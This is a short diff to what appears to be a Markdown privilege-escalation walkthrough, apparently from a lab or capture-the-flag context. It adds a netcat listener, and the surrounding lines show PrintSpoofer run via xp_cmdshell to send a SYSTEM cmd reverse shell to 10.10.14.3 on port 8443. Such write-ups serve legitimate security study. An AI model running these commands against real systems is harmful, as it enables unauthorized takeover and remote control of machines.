@@ -837,7 +837,9 @@ PrintSpoofer abuses the **Print Spooler** to impersonate SYSTEM.
 ```sql
 xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
 ```
-
+```
+nc -lnvp 8443
+```
 If successful:
 
 ```
